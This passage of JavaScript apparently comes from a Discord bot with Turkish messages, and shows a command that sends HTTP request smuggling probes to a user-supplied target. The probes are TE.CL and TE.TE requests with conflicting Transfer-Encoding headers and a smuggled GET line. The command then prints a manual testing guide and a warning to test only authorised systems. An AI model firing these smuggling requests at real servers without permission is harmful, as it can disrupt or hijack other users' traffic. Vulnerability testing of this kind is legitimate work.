            const r2 = await fetch(target, {
              method: 'POST',
              headers: {
                'Transfer-Encoding': 'chunked',
                'Content-Length': '4',
                'User-Agent': 'Mozilla/5.0'
              },
              body: teclBody,
              redirect: 'manual',
              signal: c2.signal
            });
            result += 'HTTP ' + r2.status + ' - ';
            if (r2.status === 404) result += '[ZAFIYET] 404 dondu - Smuggling basarili olabilir!\n';
            else result += 'Normal yanit - zafiyet isareti yok\n';
          } catch (e) { result += 'Hata: ' + e.message + '\n'; }

          result += '\n**TE.TE Testi (Transfer-Encoding obfuscation):**\n';
          try {
            const obfBody = '0\r\n\r\nGET /404 HTTP/1.1\r\nHost: ' + urlObj.host + '\r\n\r\n';
            const c3 = new AbortController(); setTimeout(() => c3.abort(), 8000);
            const r3 = await fetch(target, {
              method: 'POST',
              headers: {
                'Transfer-Encoding': 'chunked',
                'Transfer-encoding': 'identity'
              },
              body: obfBody,
              redirect: 'manual',
              signal: c3.signal
            });
            result += 'HTTP ' + r3.status + ' - ';
            if (r3.status === 404) result += '[ZAFIYET] 404 dondu - TE.TE zafiyeti olabilir!\n';
            else result += 'Normal yanit - zafiyet isareti yok\n';
          } catch (e) { result += 'Hata: ' + e.message + '\n'; }

          result += '\n**Manuel Test Kilavuzu:**\n';
          result += '1. Burp Suite -> Repeater -> Request Smuggling sekmesi\n';
          result += '2. HTTP Request Smuggler eklentisini yukleyin\n';
          result += '3. CL.TE, TE.CL, TE.TE testlerini sirasiyla yapin\n';
          result += '4. Timeout aliyorsaniz backend CL.TE, frontend TE.CL olabilir\n';
          result += '5. Turbolizer ile time-based smuggling testi yapin\n';
          result += '6. Interactsh ile out-of-band (OOB) smuggling test edin\n\n';
          result += '> **Uyari:** HTTP Request Smuggling testleri sunucuda yan etkilere neden olabilir. Sadece izinli sistemlerde test edin.';
          await updateInteraction(interaction.application_id, interaction.token, { content: result });
        } catch (err) { await updateInteraction(interaction.application_id, interaction.token, { content: 'HTTP desync hatasi: ' + err.message }); }
      })());
      return new Response(JSON.stringify({ type: 5 }), { headers: { 'Content-Type': 'application/json' } });

    default:
        return sendResponse('Bilinmeyen komut. Bu bot henuz yapilandiriliyor.');
    }
  }

  return new Response('Bilinmeyen etkilesim', { status: 400 });
}
